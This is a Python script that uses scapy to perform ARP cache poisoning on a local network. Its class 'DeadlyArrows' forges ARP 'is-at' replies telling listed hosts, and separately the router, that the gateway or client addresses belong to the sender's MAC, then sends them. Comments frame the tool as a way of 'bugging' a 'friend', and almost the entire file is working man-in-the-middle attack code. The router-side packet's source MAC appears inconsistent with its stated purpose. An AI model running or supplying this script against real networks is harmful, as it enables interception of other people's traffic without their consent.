# Author: Yuval Rosenthal
from scapy.layers.l2 import *
import netifaces

# A "friend searcher"
# BE WARNED DO NOT ATTACK THE SERVER!
# LOOK AT BIG BROTHER BELOW      |
#                                |
#                                |
#                               \|/
#                                v

#######################################################################
#                                 /\                                  #
#   BIG GOVERNMENT IS            /  \                                 #
#    ALWAYS WATCHING!           /    \                                #
#                              /      \                               #
#                             /  <()>  \                              #
#                            /__________\                             #
#                           /___|___|___|\                            #
#                          /___|___|___|__\                           #
#######################################################################

BROADCAST_IP = 'ff:ff:ff:ff:ff:ff'  # The broadcast mac address
DEFAULT_GATEWAY = netifaces.gateways()['default'][netifaces.AF_INET][0]
ROUTER_MAC = getmacbyip(DEFAULT_GATEWAY)
GODS_ADDRESS = get_if_hwaddr(conf.iface)
IS_AT_STATEMENT = 2


class DeadlyArrows:

    def __init__(self, list_addresses):
        self.__addresses = list_addresses

    def run(self):
        """
        Wait for the first question and reply alot :D
        """

        try:

            self.divert_to_bug()

        except KeyboardInterrupt:
            print("You will be missed! :(")
            return

    def divert_to_bug(self):
        """
         Create 2 packets one will be sent from server to client the other from server to router
         Each packet states the latter destination belongs to the servers MAC address
         In short start the "bugging" of your "friend"
        """

        response_to_your_friend = self.redirect_to_client()
        response_to_his_friend = self.redirect_to_router()

      #  print("You friend will be noticed:\n", response_to_your_friend.summary(),
      #        "\nHis Friend will know:\n", response_to_his_friend.summary())

      #  response_to_your_friend.show()
      #  response_to_his_friend.show()

        self.confuse(response_to_your_friend, response_to_his_friend)

    def redirect_to_client(self):
        """
         Create a response variable which will hold the packet sent to the client
        :return: The response -> client packet
        """

        responses = self.create_impostor()

        return responses

    def create_impostor(self):
        """
         Create the response to client packet
        :return: The response packet
        """

        responses = []

        for address in self.__addresses:
            pack = (Ether(src=GODS_ADDRESS, dst=address[1]) / ARP(hwsrc=GODS_ADDRESS, hwdst=address[1],
                    psrc=DEFAULT_GATEWAY, pdst=address[0], op=IS_AT_STATEMENT))
            responses.append(pack)

        return responses

    def redirect_to_router(self):
        """
         Create a response variable which will hold the packet sent to the router
        :return: The response -> router packet
        """

        response = self.create_him()

        return response

    def create_him(self):
        """
         Create the response to router packet
        :return: The response packet
        """

        responses = []

        for address in self.__addresses:
            pack = (Ether(src=GODS_ADDRESS, dst=ROUTER_MAC) / ARP(hwsrc=address[1], hwdst=ROUTER_MAC,
                                                                  psrc=address[0], pdst=DEFAULT_GATEWAY,
                                                                  op=IS_AT_STATEMENT))
            responses.append(pack)

        return responses

    def confuse(self, response_to_your_friend, response_to_his_friend):
        """
         Inform router you are the client and the client that you are the server(GOD)
        :param response_to_your_friend: Packet -> Client
        :param response_to_his_friend: Packet -> Router/ISP provider
        """

        sendp(response_to_your_friend, count=5)
        sendp(response_to_his_friend, count=5)
